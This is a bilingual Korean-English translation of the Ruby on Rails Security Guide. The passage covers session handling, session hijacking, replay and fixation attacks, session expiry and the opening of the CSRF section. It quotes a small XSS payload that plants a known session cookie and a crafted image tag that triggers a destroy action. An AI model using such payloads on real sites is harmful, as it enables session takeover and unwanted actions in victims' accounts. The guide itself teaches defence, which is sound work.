[Ruby on Rails Security Guide] 루비온레일스 보안 가이드
============================

이 매뉴얼은 웹어플리케이션에서 발생하는 일반적인 보안 문제를 설명하고 레일스로 이러한 문제를 해결하는 방법을 소개 합니다. [[[This manual describes common security problems in web applications and how to avoid them with Rails.]]]

이 가이드를 읽은 후에는 아래와 같은 내용을 알게 될 것입니다. [[[After reading this guide, you will know:]]]

* _중요한_ 대처방법 [[[All countermeasures _that are highlighted_.]]]

* 레일스에서의 세션 개념, 세션에 두어야 할 것들, 흔한 공격방법 [[[The concept of sessions in Rails, what to put in there and popular attack methods.]]]

* 특정 사이트를 방문하는 것만(CSRF)으로도 보안문제가 발생할 수 있는 이유 [[[How just visiting a site can be a security problem (with CSRF).]]]

* 파일 작업을 하거나 관리자 페이지를 제공할 때 주의해야 할 점 [[[What you have to pay attention to when working with files or providing an administration interface.]]]

* 사용자 관리방법(로그인/로그아웃)과 모든 레이어 상에서 메소드를 공격하는 방법 [[[How to manage users: Logging in and out and attack methods on all layers.]]]

* 가장 흔한 주입 공격 메소드 [[[And the most popular injection attack methods.]]]

--------------------------------------------------------------------------------

[Introduction] 개요
------------

웹어플리케이션 프레임워크는 개발자들의 웹어플리케이션 제작을 도와줍니다. 몇가지는 웹어플리케이션의 보안관련 사항도 지원해 줍니다. 실제로는 하나의 프레임워크가 다른 것 보다 보안상 더 안전하지는 것은 없습니다. 즉, 정확하게 사용한다면 몇가지 프레임워크를 함께 사용하여 보다 안전한 웹어플리케이션을 만들 수 있습니다. 루비온레일스는 예를 들어 SQL 주입에 대한 문제를 방지하기 위한 몇가지 영리한 헬퍼 메소드를 가지고 있어서 거의 문제가 되지 않습니다. 점검해 본 모든 레일스 어플리케이션이 양호한 보안상태를 보였다는 사실을 알게 되면 좋아할 것입니다. [[[Web application frameworks are made to help developers build web applications. Some of them also help you with securing the web application. In fact one framework is not more secure than another: If you use it correctly, you will be able to build secure apps with many frameworks. Ruby on Rails has some clever helper methods, for example against SQL injection, so that this is hardly a problem. It's nice to see that all of the Rails applications I audited had a good level of security.]]]

일반적으로, 그냥 사용하면 보안상태가 유지되는 것은 없습니다. 보안은 프레임워크를 어떻게 사용했는가에 좌우되고 때로는 개발 방법에 따라 달라질 수 있습니다. 그리고 웹어플리케이션 환경의 모든 레이어에서의 구현 방법에 좌우되는데, 백엔드 저장, 웹서버, 웹어플리케이션 자체, 그외에도 다른 레이어에서도 영향을 받을 수 있습니다. [[[In general there is no such thing as plug-n-play security. Security depends on the people using the framework, and sometimes on the development method. And it depends on all layers of a web application environment: The back-end storage, the web server and the web application itself (and possibly other layers or applications).]]]

그러나, 가트너 그룹의 보고에 의하면 공격의 75%가 웹어플리케이션 레이어에서 이루어졌고 300개의 점검 웹사이트 중에서 97%가 공격에 취약한 것으로 밝혀 졌습니다. 이유는 웹어플리케이션은 비교적 공격하기가 쉽기 때문인데, 일반인들도 쉽게 이해하고 조작할 수 있기 때문인데 바로 이러한 점이 공격이 용이한 이유이기도 합니다. [[[The Gartner Group however estimates that 75% of attacks are at the web application layer, and found out "that out of 300 audited sites, 97% are vulnerable to attack". This is because web applications are relatively easy to attack, as they are simple to understand and manipulate, even by the lay person.]]]

웹어플리케이션에 대한 보안상의 문제점들로는, 사용자 계정 하이재킹, 접근통제의 우회술, 민간한 데이터를 읽거나 수정하기, 가짜 컨텐츠 보여주기 등이 있습니다. 또는 공격자는 Trojan 목마 프로그램이나 쓸모없는 이메일 발송 소프트웨어를 설치하거나, 재정확장을 목적으로 하거나 회사 자원을 변경하여 상품명에 손상을 입힐 수 있습니다. 이러한 공격을 막기 위해서는, 공격의 영향을 최소한으로 하고 공격 포인트를 제거하고, 무엇보다도 먼저, 정확한 대책을 찾기 위해서는 공격방법을 잘 이해해야만 합니다. 바로 이것이 본 가이드이 목적입니다. [[[The threats against web applications include user account hijacking, bypass of access control, reading or modifying sensitive data, or presenting fraudulent content. Or an attacker might be able to install a Trojan horse program or unsolicited e-mail sending software, aim at financial enrichment or cause brand name damage by modifying company resources. In order to prevent attacks, minimize their impact and remove points of attack, first of all, you have to fully understand the attack methods in order to find the correct countermeasures. That is what this guide aims at.]]]

안전한 웹어플리케이션을 개발하기 위해서는, 모든 레이어에 대한 보안상의 최신 정보를 유지하고 적에 대해서 알아야 합니다. 최신 정보를 지속적으로 얻기 위해서는 보안관련 메일링 리스트를 구독하고 보안관련 블로그를 읽어 최신의 보안정보로 업데이트하고 보안상태를 점검하는 것을 습관으로 해야 합니다(<a href="#additional-resources">Additional Resources</a> 챕터를 보기 바랍니다). 저자의 경우 이러한 일이, 짜증나는 이론상의 보안 문제를 찾는 방법이기 때문에 직접 작업하고 있습니다. [[[In order to develop secure web applications you have to keep up to date on all layers and know your enemies. To keep up to date subscribe to security mailing lists, read security blogs and make updating and security checks a habit (check the <a href="#additional-resources">Additional Resources</a> chapter). I do it manually because that's how you find the nasty logical security problems.]]]

[Sessions] 세션
--------

보안문제를 찾아 보는 시작점으로는 세션이 적당한데, 세션은 특정 공격에 취약할 수 있기 때문입니다. [[[A good place to start looking at security is with sessions, which can be vulnerable to particular attacks.]]]

### [What are Sessions?] 세션이란 무엇인가?

NOTE: _HTTP는 상태를 유지하지 못하는 stateless 프로토콜입니다. 그러나, 세션은 상태를 유지할 수 있게 해 줍니다._ [[[_HTTP is a stateless protocol. Sessions make it stateful._]]]

대부분의 어플리케이션은 사용자의 상태를 추적할 필요가 있습니다. 쇼핑 바스켓의 내용이나 현재 로그인한 사용자의 id가 이에 해당할 수 있습니다. 세션이라는 개념이 없다면 아마도 매 요청시마다 사용자를 확인해서 인증해야 할 것입니다. 레일스는 새로운 사용자가 해당 어플리케이션에 접근할 때 자동으로 새로운 세션을 만들게 됩니다. 사용자가 이미 해당 어플리케이션을 사용한 적이 있다면 이전의 세션 값을 로드할 것입니다. [[[Most applications need to keep track of certain state of a particular user. This could be the contents of a shopping basket or the user id of the currently logged in user. Without the idea of sessions, the user would have to identify, and probably authenticate, on every request. Rails will create a new session automatically if a new user accesses the application. It will load an existing session if the user has already used the application.]]]

하나의 세션은 대개 해시값들과 이 해시값에 대한 ID 값(32개의 문자열로 이루어진) 세션 id로 구성됩니다. 클라이언트 브라우져로 보내지는 모든 쿠키는 이 세션 id를 포함합니다. 그래서 클라이언트로부터 매 요청시마다 브라우저는 이 쿠키를 보내게 되는 것입니다. 레일스에서는 session 메소드를 이용하여 해당 값들을 저장하고 찾아볼 수 있습니다. [[[A session usually consists of a hash of values and a session id, usually a 32-character string, to identify the hash. Every cookie sent to the client's browser includes the session id. And the other way round: the browser will send it to the server on every request from the client. In Rails you can save and retrieve values using the session method:]]]

```ruby
session[:user_id] = @current_user.id
User.find(session[:user_id])
```

### [Session id] 세선 id

NOTE: _세션 id는 32 바이트 길이의 MD5 해시값을 가집니다._ [[[_The session id is a 32 byte long MD5 hash value._]]]

세션 id 는 무작위 문자열을 가지는 해시로 구성되어 있습니다. 이 무작위 문자열은, 현재 시간, 0 과 1 사이의 무작위 숫자, 루비 인터프리터의 프로세스 id 숫자(역시 기본적으로 무작위 숫자), 그리고 상수 문자열로 구성되어 있습니다. 현재로서는 레일스의 세선 id 값을 무차별 대입 공격으로 알아낼 수 없습니다. 아직까지 MD5가 건재하지만 의견 충돌이 있어 왔습니다. 그래서 이론적으로는 동일한 값을 가지는 input 텍스트를 만들 수 있습니다. 그러나, 아직까지는 보안상의 문제점을 일으킨 적이 없습니다. [[[A session id consists of the hash value of a random string. The random string is the current time, a random number between 0 and 1, the process id number of the Ruby interpreter (also basically a random number) and a constant string. Currently it is not feasible to brute-force Rails' session ids. To date MD5 is uncompromised, but there have been collisions, so it is theoretically possible to create another input text with the same hash value. But this has had no security impact to date.]]]

### [Session Hijacking] 세션 하이재킹 (세션 가로채기)

WARNING: _공격자가 사용자의 세션 id를 가로채면 해당 사용자의 이름으로 웹어플리케이션을 사용할 수 있게 됩니다._ [[[_Stealing a user's session id lets an attacker use the web application in the victim's name._]]]

많은 수의 웹어플리케이션들이 인증시스템을 가지고 있어서, 사용자가 이름과 비밀번호를 보내면, 웹어플리케이션이 확인 후 해당 사용자의 id를 세션 해시에 저장하게 됩니다. 이로인해 사용자는 유효한 세션을 가지게 되는 것입니다. 따라서, 매 요청시마다 어플리케이션은 새롭게 인증절차를 밟지 않고 세션 값 중에 사용자 id 를 확인하여 사용자를 로드하게 됩니다. 쿠키내의 세션 id는 세션을 확인하는데 사용합니다. [[[Many web applications have an authentication system: a user provides a user name and password, the web application checks them and stores the corresponding user id in the session hash. From now on, the session is valid. On every request the application will load the user, identified by the user id in the session, without the need for new authentication. The session id in the cookie identifies the session.]]]

따라서, 쿠키는 웹어플리케이션을 위한 임시 인증시스템으로서 역할을 하게 됩니다. 다른 사람의 쿠키 값을 이용하면 마치 해당 사람인 것처럼 어플리케이션을 사용할 수 있게 되어 심각한 결과를 초개할 수 있습니다. 아래에는 세션을 가로채는 몇가지 방법들을 소개합니다. [[[Hence, the cookie serves as temporary authentication for the web application. Anyone who seizes a cookie from someone else, may use the web application as this user - with possibly severe consequences. Here are some ways to hijack a session, and their countermeasures:]]]

* 보안상 안전하지 못한 네트워크. 무선 LAN이 이러한 네트워크의 예가 될 수 있습니다. 암호화되지 않는 무선 LAN에서는 특히 연결된 모든 클라이언트의 트래픽을 쉽게 들여다 볼 수 있습니다. 이런 문제가 커피 숍에서 작업을 하지 않게 되는 또 하나의 이유이기도 합니다. 웹어플리케이션 개발자들을 위해서는 _SSL(Secure Socket Layer)로 안전하게 네트워크에 접속_할 수 있어야 합니다. 레일스 3.1부터는, 어플리케이션 config 파일에 항상 SSL로 강제 연결하도록 하여 이러한 문제를 해결할 수 있도록 지원하고 있습니다. [[[* Sniff the cookie in an insecure network. A wireless LAN can be an example of such a network. In an unencrypted wireless LAN it is especially easy to listen to the traffic of all connected clients. This is one more reason not to work from a coffee shop. For the web application builder this means to _provide a secure connection over SSL_. In Rails 3.1 and later, this could be accomplished by always forcing SSL connection in your application config file:]]]

    ```ruby
    config.force_ssl = true
    ```

* 대부분의 사람들은 공중 컴퓨터 터미널에서 작업을 한 후에 쿠키를 제거하지 않습니다. 그래서 마지막 사용자가 웹어플리케이션으로부터 로그 아웃하지 않았다면, 다른 사람이 해당 사용자의 로그상태를 이용할 수 있게 되는 것입니다. 따라서 웹어플리케이션에서 사용자에게 _로그아웃 버튼_을 제공해 주고 눈에 쉽게 띄게 만들어 놓아야 합니다. [[[* Most people don't clear out the cookies after working at a public terminal. So if the last user didn't log out of a web application, you would be able to use it as this user. Provide the user with a _log-out button_ in the web application, and _make it prominent_.]]]

* 많은 수의 XSS(cross-site scripting) 공격은 사용자의 쿠키를 얻는 것을 목적으로 합니다. 나중에 <a href="#cross-site-scripting-xss">XSS에 대한 자세한 내용</a>을 읽어 보기 바랍니다. [[[* Many cross-site scripting (XSS) exploits aim at obtaining the user's cookie. You'll read <a href="#cross-site-scripting-xss">more about XSS</a> later.]]]

* 공격자가 알지 못하는 다른 사람의 쿠키를 훔치는 대신에, 공격자가 알고 있는 쿠키상의 사용자의 세션 id 값을 고정시키는 경우도 있습니다. 소위 세션 fixation 에 대해서 나중에 자세히 읽어 보기 바랍니다. [[[* Instead of stealing a cookie unknown to the attacker, he fixes a user's session identifier (in the cookie) known to him. Read more about this so-called session fixation later.]]]

대부분의 공격자들의 주 목적은 돈을 벌기 위함입니다. [Symantec Global Internet Security Threat Report](http://eval.symantec.com/mktginfo/enterprise/white_papers/b-whitepaper_internet_security_threat_report_xiii_04-2008.en-us.pdf)에 따르면, 은행 로그인 계정에 대해서(은행 잔고에 따라 달라질 수 있지만) 10~1000불 정도에, 신용카드번호에 대해서는 0.40~20불 정도, 온라인 경매 사이트 계정에 대해서는 1~8불 정도, 이메일 비밀번호에 대해서는 4~30불에 암거래되고 있습니다. [[[The main objective of most attackers is to make money. The underground prices for stolen bank login accounts range from $10-$1000 (depending on the available amount of funds), $0.40-$20 for credit card numbers, $1-$8 for online auction site accounts and $4-$30 for email passwords, according to the [Symantec Global Internet Security Threat Report](http://eval.symantec.com/mktginfo/enterprise/white_papers/b-whitepaper_internet_security_threat_report_xiii_04-2008.en-us.pdf).]]]

### [Session Guidelines] 세션 가이드라인

아래에 세션에 관련된 몇가지 일반적인 가이드라인이 있습니다. [[[Here are some general guidelines on sessions.]]]

* _하나의 세션이 용량이 큰 객체들을 저장하지 않는다_. 대신에 이 객체들을 데이터베이스에 저장하고 id 값을 세션에 저장해야 합니다. 이렇게 하므로써 동기화와 관련된 골치아픈 문제들을 제거하게 되고 어떤 세선 저장소를 선택하느냐에 따라 세션 저장 공간을 절약할 수 있게 될 것입니다. 또한 이것은 특정 객체의 구조를 변경할 경우 이전 버전의 객체가 다른 사용자의 쿠키에 여전히 존재할 경우에 대한 좋은 대안이 될 수 있습니다. 서버 측 세션 저장소를 사용할 경우에는 쉽게 세션들을 제거할 수 있지만, 클라이언트 측 저장소를 사용할 경우에는 세션 제거가 어렵게 됩니다. [[[_Do not store large objects in a session_. Instead you should store them in the database and save their id in the session. This will eliminate synchronization headaches and it won't fill up your session storage space (depending on what session storage you chose, see below). This will also be a good idea, if you modify the structure of an object and old versions of it are still in some user's cookies. With server-side session storages you can clear out the sessions, but with client-side storages, this is hard to mitigate.]]]

* _중요한 데이터는 세선에 저장하지 않는다_. 사용자가 자신의 쿠키를 제거하거나 브라우저를 닫게 될 경우 세션 값들은 사라지게 될 것입니다. 그리고 클라이언트 측에 세션을 저정할 경우 사용자가 세션 데이터를 읽을 수 있게 됩니다. [[[_Critical data should not be stored in session_. If the user clears his cookies or closes the browser, they will be lost. And with a client-side session storage, the user can read the data.]]]

### [Session Storage] 세션 저장소

NOTE: _레일스는 세션 해시를 다영한 곳에 저정할 수 있게 지원합니다. 가장 중요한 것은 `ActionDispatch::Session::CookieStore`입니다._ [[[_Rails provides several storage mechanisms for the session hashes. The most important is `ActionDispatch::Session::CookieStore`._]]]

레일스 2는 CookieStore라는 새로운 디폴트 세션 저장소를 도입했습니다. CookieStore 는 세션 해시를 클라이언트 측의 쿠기에 직접 저장하게 됩니다. 서버는 클라언트로부터 온 쿠기로부터 세션 해시를 점검하므로 새로운 세션 id를 만들 필요가 없게 됩니다. 결국은 어플리케이션의 엄청난 속도 개선 효과를 가져오게 되지만 이것은 논란의 여지가 있는 저장 옵션이어서 쿠기의 보안측면을 고려해야만 합니다. [[[Rails 2 introduced a new default session storage, CookieStore. CookieStore saves the session hash directly in a cookie on the client-side. The server retrieves the session hash from the cookie and eliminates the need for a session id. That will greatly increase the speed of the application, but it is a controversial storage option and you have to think about the security implications of it:]]]

* 쿠키는 4kb의 크기 제한이 있습니다. 이전에 언급한 바와 같이 어떤 상황에서도 세션에 많은 양의 데이터를 저장해서는 안 된다는 것을 감안할 때 충분한 크기인 것입니다. _현재 사용자의 데이터베이스 id를 세션에 저장하는 정도는 대개 문제가 없습니다._ [[[Cookies imply a strict size limit of 4kB. This is fine as you should not store large amounts of data in a session anyway, as described before. _Storing the current user's database id in a session is usually ok_.]]]

* 클라이언트는, 세션 데이터가 암호화되지 않는 clear-text로 저장되기 때문에, 세션에 저장되는 모든 데이터를 읽을 수 있게 됩니다. 따라서, _세션에 비밀스러운 것을 저장하기를 원치않 않을 것입니다_. 세션 해시를 조작하는 것을 방지하기 위해서는, 서버측 secret 키를 이용하여 해당 세션으로부터 계산된 digest 값을 쿠키 끝에 추가해 줍니다. [[[The client can see everything you store in a session, because it is stored in clear-text (actually Base64-encoded, so not encrypted). So, of course, _you don't want to store any secrets here_. To prevent session hash tampering, a digest is calculated from the session with a server-side secret and inserted into the end of the cookie.]]]

즉, 쿠키 저장소의 보안은 바로 이 secret 키에 좌우됩니다(그리고, digest 알고리듬 상, 호환성을 위해서 디폴트로 SHA1 값을 사용합니다.) 따라서 _사전에 있는 임의의 단어, 즉, 30자 보다 짧은 문자열과 같은 짧은 secret 키를 사용해서는 안됩니다_. [[[That means the security of this storage depends on this secret (and on the digest algorithm, which defaults to SHA1, for compatibility). So _don't use a trivial secret, i.e. a word from a dictionary, or one which is shorter than 30 characters_.]]]

`config.secret_key_base`는, 특정 어플리케이션 세션값의 변조를 방지하기 위해서 세션값을 이미 알려진 보안 키와 대조하기 위해서 사용하는 키를 지정하기 위해 사용됩니다. 어플리케이션은, 예를 들어, `config/initializers/secret_token.rb` 파일에 무작위 키 값으로 초기화 합니다. [[[`config.secret_key_base` is used for specifying a key which allows sessions for the application to be verified against a known secure key to prevent tampering. Applications get `config.secret_key_base` initialized to a random key in `config/initializers/secret_token.rb`, e.g.:]]]

    YourApp::Application.config.secret_key_base = '49d3f3de9ed86c74b94ad6bd0...'

레일스의 예전 버전에서는, EncryptedCookiStore에서 사용하는 `secrete_key_base` 값 대신에 `secrete_token` 값을 사용하는 CookieStore를 사용합니다. 자세한 내용을 위해서는 업그레이드 문서를 읽기 바랍니다. [[[Older versions of Rails use CookieStore, which uses `secret_token` instead of `secret_key_base` that is used by EncryptedCookieStore. Read the upgrade documentation for more information.]]]

소스가 공개된 특정 어플리케이션과 같이 secret 키가 노출된 경우에는 이 값을 변경해야 합니다. [[[If you have received an application where the secret was exposed (e.g. an application whose source was shared), strongly consider changing the secret.]]]

### [Replay Attacks for CookieStore Sessions] CookieStore 세션에 대한 Replay 공격

TIP: _`CookieStore`를 사용할 때 알아 두어야 할 또 다른 공격방법으로 replay 공격이 있습니다_. [[[_Another sort of attack you have to be aware of when using `CookieStore` is the replay attack._]]]

이 공격법은 다음과 같습니다. [[[It works like this:]]]

* 임의의 사용자가 크레딧을 받아서 세션에 저장한다고 가정하겠습니다. 어쨌던 이러한 방법은 좋은 아이디어는 아니지만 데모 목적으로 이와 같이 할 것입니다. [[[A user receives credits, the amount is stored in a session (which is a bad idea anyway, but we'll do this for demonstration purposes).]]]

* 이 사용자가 어떤 물건을 구매합니다. [[[The user buys something.]]]

* 이제 세션에 새로운 만들어진 참감 크레딧을 저장될 것입니다. [[[His new, lower credit will be stored in the session.]]]

* 이 사용자는 잠시 나쁜 생각을 하게 되어 첫번째 단계로부터 쿠키 값을 복사해서 가져와서 현재의 쿠키값으로 교체해 버립니다. [[[The dark side of the user forces him to take the cookie from the first step (which he copied) and replace the current cookie in the browser.]]]

* 이 사용자는 이제 크레딧을 이전의 상태로 되돌아가게 됩니다. [[[The user has his credit back.]]]

세션에 nonce(무작위 값)을 포함하면 이러한 replay 공격을 피할 수 있습니다. nonce는 일회성에 한하여 유효하므로 서버는 모든 유효 nonce 값들을 가지고 있어야 합니다. mongrels와 같이 여러개의 서버를 가지고 있을 경우 더욱 복잡하게 됩니다. 그러나 이러한 nonce 값들은 데이터베이스 테이블에 저장하게 되면 (데이터베이스 접근을 하지 않는) CookieStore의 목적이 무색케 됩니다. [[[Including a nonce (a random value) in the session solves replay attacks. A nonce is valid only once, and the server has to keep track of all the valid nonces. It gets even more complicated if you have several application servers (mongrels). Storing nonces in a database table would defeat the entire purpose of CookieStore (avoiding accessing the database).]]]

따라서 이것을 피하는 _최상의 해결책은 이러한 류의 데이터는 세션이 아니라 데이터베이스에 저장하는 것_입니다. 이러한 경우에는 크레딧을 데이터베이스에 저장하고 logged_in_user_id는 세션에 저장해야 합니다. [[[The best _solution against it is not to store this kind of data in a session, but in the database_. In this case store the credit in the database and the logged_in_user_id in the session.]]]

### [Session Fixation] 세션 값의 고정

NOTE: _특정 사용자의 세션 id 값을 가로채는 것과는 별개로, 공격자는 자신이 알고 있는 세션 id 값을 고정시킬 수 있습니다. 이러한 공격법을 세션 고정이라고 합니다. [[[_Apart from stealing a user's session id, the attacker may fix a session id known to him. This is called session fixation._]]]

![Session fixation](images/session_fixation.png)

이러한 공격법은 특정 사용자의 세션 id 값을 공격자가 알고 있는 값으로 고정하는 것인데, 해당 사용자의 브라우저가 이 고정 값을 사용하도록 강제하게 됩니다. 따라서 이후로는 공격자가 해당 세션 id 값을 가로챌 필요가 없게 됩니다. 아래에 이러한 공격이 동작하는 방법을 소개 합니다. [[[This attack focuses on fixing a user's session id known to the attacker, and forcing the user's browser into using this id. It is therefore not necessary for the attacker to steal the session id afterwards. Here is how this attack works:]]]

* 공격자는 유효한 세션 id 값을 생성합니다: 즉, 공격자가 세션 값을 고정시키고자는 하는 웹어플리케이션의 로그인 페이지로 접속해서 (이미지의 1, 2번에서 보는 바와 같이) 서버로 부터 응답으로 오는 쿠키에서 세션 id 값을 취하게 됩니다. [[[The attacker creates a valid session id: He loads the login page of the web application where he wants to fix the session, and takes the session id in the cookie from the response (see number 1 and 2 in the image).]]]

* 공격자는 이 세션 값을 지속적으로 유지할 수 있습니다. 예를 들어 20분마다 세션을 사용 정지하도록 하면 공격에 대한 노출시간을 상당히 줄이게 됩니다. 따라서, 공격자는 세션을 유지하기 위해서 이따금씩 해당 웹어플리케이션에 접속하게 됩니다. [[[He possibly maintains the session. Expiring sessions, for example every 20 minutes, greatly reduces the time-frame for attack. Therefore he accesses the web application from time to time in order to keep the session alive.]]]

* 이제 공격자는 강제로 해당 사용자의 브라우저가 (이미지 3번에서 볼 수 있듯이) 이 세션 id 값을 이용하도록 할 수 있을 것입니다. (same origin policy에 따라) 다른 도메인의 쿠키를 변경할 수 없기 때문에, 공격자는 대상 웹어플리케이션의 도메인으로부터 자바스크립트를 실행해야만 합니다. 자바스크립트 코드를 XSS를 이용하여 대상 어플리케이션으로 주입하게 되면 이러한 공격이 이루어지게 되는 것입니다. 예를 들면, `<script>document.cookie="_session_id=16d5b78abb28e3d6206b60f22a03c8d9";</script>` 와 같습니다. 나 중에 XSS와 코드 주입에 대해서 자세히 읽어 보기 바랍니다. [[[Now the attacker will force the user's browser into using this session id (see number 3 in the image). As you may not change a cookie of another domain (because of the same origin policy), the attacker has to run a JavaScript from the domain of the target web application. Injecting the JavaScript code into the application by XSS accomplishes this attack. Here is an example: `<script>document.cookie="_session_id=16d5b78abb28e3d6206b60f22a03c8d9";</script>`. Read more about XSS and injection later on.]]]

* 공격자는 사용자가 자바스크립트 코드가 감염된 페이지로 접속하도록 유도합니다. 이 페이지에 접속하게 되면 해당 사용자의 브라우저는 공격용 세션 id로 세션 id 값을 변경하게 될 것입니다. [[[The attacker lures the victim to the infected page with the JavaScript code. By viewing the page, the victim's browser will change the session id to the trap session id.]]]

* 이와 같이 감염된 세션을 사용하지 않을 경우에는, 사용자는 새로 인증절차를 밟게 될 것입니다. [[[As the new trap session is unused, the web application will require the user to authenticate.]]]

* 이제부터는, 공격자와 희생자가 동일한 세션으로 웹어플리케이션을 함께 사용하게 될 것입니다. 즉, 세션이 유효하기 때문에, 희생자는 이러한 공격을 알지 못하게 됩니다. [[[From now on, the victim and the attacker will co-use the web application with the same session: The session became valid and the victim didn't notice the attack.]]]

### [Session Fixation - Countermeasures] 세션 고정 - 대책

TIP: _코드라인 한줄을 추가해 주면 세션 고정을 피할 수 있게 될 것입니다._ [[[_One line of code will protect you from session fixation._]]]

가장 효과적인 대처방법은 _새로운 세션을 만들어_ 로그인에 성공하면 이전 세션을 유효하지 않다고 선언해 버리는 것입니다. 이렇게 하므로써 공격자는 더 이상 고정된 세션을 사용할 수 없게 됩니다. 이것은 또한 세션 가로채기에 대해서 훌륭한 대처방법이 되기도 합니다. 아래에 렝리스에서 새로운 세션을 만드는 방법을 소개 합니다. [[[The most effective countermeasure is to _issue a new session identifier_ and declare the old one invalid after a successful login. That way, an attacker cannot use the fixed session identifier. This is a good countermeasure against session hijacking, as well. Here is how to create a new session in Rails:]]]

```ruby
reset_session
```

일반적으로 사용하는 RestfulAuthentication 플러그인을 사용해서 사용자 관리를 한다면, SessionsController#create 액션에 reset\_session 을 추가해 줍니다. 주의할 것은 이 메소드를 사용하면 세션의 모든 값을 제거하기 때문에, _세션 데이터를 새로운 세션으로 옮겨야 한다_는 것입니다. [[[If you use the popular RestfulAuthentication plugin for user management, add reset\_session to the SessionsController#create action. Note that this removes any value from the session, _you have to transfer them to the new session_.]]]

또 다른 조치로는 세션에 사용자를 인식할 수 있는 속성값을 저장해 주어서_, 요청이 들어 올 때마다 확인절차를 거쳐서 해당 정보가 일치하지 않는 경우 거부해 버리는 것입니다. 이와 같은 사용자 인식 속성들로는 원격지 IP 주소나 사용자 특이도가 떨어지기는 하지만 웹브라우저 이름을 사용할 할 수 있습니다. IP 주소를 저장할 때 주의할 점은, 인터넷 서비스 제공업체나 규모가 큰 조직인은 사용자를 프록시 뒤에 둔다는 것입니다. _이것은 사용자의 세션의 변경할 수 있어서 사용자들이 어플리케이션을 사용할 수 없거나 아주 제한적으로만 사용하게 됩니다. [[[Another countermeasure is to _save user-specific properties in the session_, verify them every time a request comes in, and deny access, if the information does not match. Such properties could be the remote IP address or the user agent (the web browser name), though the latter is less user-specific. When saving the IP address, you have to bear in mind that there are Internet service providers or large organizations that put their users behind proxies. _These might change over the course of a session_, so these users will not be able to use your application, or only in a limited way.]]]

### [Session Expiry] 세션 만료

NOTE: _세션의 만기일이 없다면 CSRF, 세션 가로채기, 세션 고정과 같은 공격에 대한 기회가 많아지게 됩니다._ [[[_Sessions that never expire extend the time-frame for attacks such as cross-site reference forgery (CSRF), session hijacking and session fixation._]]]

한가지 대처 가능성은 세션 id와 함께 쿠키에 만료일을 설정하는 것입니다. 그러나 클라이언트가 웹브라우저에 저장되는 쿠키의 내용을 수정할 수 있기 때문에 서버측에서 세션을 만료시키는 것이 더 안전합니다. 아래에는 _데이터베이스 테이블에서 세션을 만료시기는 방법_ 을 보여 줍니다. `Session.sweep("20 minites")`와 같이 호출하면 20분 이전에 사용되었던 세션들을 만료시킬 수 있습니다. [[[One possibility is to set the expiry time-stamp of the cookie with the session id. However the client can edit cookies that are stored in the web browser so expiring sessions on the server is safer. Here is an example of how to _expire sessions in a database table_. Call `Session.sweep("20 minutes")` to expire sessions that were used longer than 20 minutes ago.]]]

```ruby
class Session < ActiveRecord::Base
  def self.sweep(time = 1.hour)
    if time.is_a?(String)
      time = time.split.inject { |count, unit| count.to_i.send(unit) }
    end

    delete_all "updated_at < '#{time.ago.to_s(:db)}'"
  end
end
```

세션 고정에 대한 설명에서 세션을 유지하는 것에 대한 문제점을 언급한 바 있습니다. 공격자가 5분마다 세션을 유지할 경우 사용자가 세션을 만료해도 세션을 영구히 유지할 수 있게 됩니다. 이러한 문제에 대한 해결방안은 세션 테이블에 created_at 컬럼을 추가하는 것입니다. 이로써 오래전에 만들어졌던 세션들을 삭제할 수 있게 되는 것입니다. 위에서 언급한 sweep 메소드에 아래의 코드라인을 추가할 수 있습니다. [[[The section about session fixation introduced the problem of maintained sessions. An attacker maintaining a session every five minutes can keep the session alive forever, although you are expiring sessions. A simple solution for this would be to add a created_at column to the sessions table. Now you can delete sessions that were created a long time ago. Use this line in the sweep method above:]]]

```ruby
delete_all "updated_at < '#{time.ago.to_s(:db)}' OR
  created_at < '#{2.days.ago.to_s(:db)}'"
```

[Cross-Site Request Forgery (CSRF)] 사이트간 요청 위조(CSRF)
---------------------------------

이 공격방법은, 특정 사용자가 인증받은 바 있는 웹어플리케이션으로 연결되는, 특정 페이지에 악성 코드나 링크를 삽입하여 동작합니다. 해당 웹어플리케이션에 대한 세션이 유지된 상태라면, 공격자가 인증받지 못한 명령도 수행할 수 있게 될 것입니다. [[[This attack method works by including malicious code or a link in a page that accesses a web application that the user is believed to have authenticated. If the session for that web application has not timed out, an attacker may execute unauthorized commands.]]]

![](images/csrf.png)

<a href="#sessions">session 챕터</a>에서 대부분의 레일스 어플리케이션에서 쿠키를 이용한 세션을 이용한다는 것을 배웠습니다. 즉, 세션 id를 쿠키에 저장하여 서버측 세션 해시에 두거나, 전체 세션 해시를 클라이언트 측에 두게 됩니다. 어떤 경우에든, 해당 도메인에 대한 쿠키가 있을 경우, 매 요청시마다 브라우저는 자동으로 쿠키를 함께 도메인으로 보내게 됩니다. 다른 도메인으로부터의 요청이 있을 때에도 해당 쿠키를 보내게 되는지에 대해서는 논란의 여지가 있습니다. 아래의 예를 보도록 하겠습니다. [[[In the <a href="#sessions">session chapter</a> you have learned that most Rails applications use cookie-based sessions. Either they store the session id in the cookie and have a server-side session hash, or the entire session hash is on the client-side. In either case the browser will automatically send along the cookie on every request to a domain, if it can find a cookie for that domain. The controversial point is, that it will also send the cookie, if the request comes from a site of a different domain. Let's start with an example:]]]

* Bob 은 게시판에서 해커가 조작한 HTML image 엘리먼트가 포함되어 있는 임의의 게시물을 보게 됩니다. 이 이미지 엘리먼트는 이미지 파일이 아니라 Bob 의 프로젝트 관리 어플리케이션에 있는 특정 명령을 참조하도록 되어 있습니다. [[[Bob browses a message board and views a post from a hacker where there is a crafted HTML image element. The element references a command in Bob's project management application, rather than an image file.]]]

* `<img src="http://www.webapp.com/project/1/destroy">`

* Bob 은 (몇분전에) 아직 로그아웃을 하지 않은 상태여서 www.webapp.com 에 대한 세션이 그대로 살아 있습니다. [[[Bob's session at www.webapp.com is still alive, because he didn't log out a few minutes ago.]]]

* Bob 이 해당 게시물을 보는 동작을 하게 될 때 브라우저는 이미지 태그를 찾게 됩니다. 그리고 www.webapp.com으로부터 (의심스러운) 해당 이미지를 로드하려고 시도하게 됩니다. 앞에서 설명한 바와 같이, 브라우저는 유효 세션 id가 들어 있는 쿠키와 함께 요청을 보내게 될 것입니다. [[[By viewing the post, the browser finds an image tag. It tries to load the suspected image from www.webapp.com. As explained before, it will also send along the cookie with the valid session id.]]]

